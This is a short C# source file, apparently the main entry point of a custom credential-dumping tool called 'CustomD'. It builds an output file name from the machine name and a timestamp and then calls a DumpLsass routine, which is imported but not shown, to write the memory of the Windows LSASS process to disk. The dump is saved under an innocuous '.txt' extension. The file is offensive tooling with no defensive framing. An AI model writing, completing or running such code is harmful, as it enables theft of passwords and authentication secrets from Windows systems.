using System;
using System.IO;
using static CustomD.DumpProc;

namespace CustomD
{
    public class Program
    {
        public static byte[] dumpBuffer = new byte[200 * 1024 * 1024];
        public static int bufferSize = 0;



        public static void Main(string[] args)
        {
            // Generate the file name or get it from the input arguments
            String filename;
            if (args == null || args.Length == 0)
            {
                String now = DateTime.Now.ToString("dd-MM-yy-HHmm");
                String extension = ".txt";
                filename = Directory.GetCurrentDirectory() + "\\" + Environment.MachineName + "_" + now + extension;
            }
            else
            {
                filename = args[0];
            }
            DumpLsass(filename);
        }
    }

}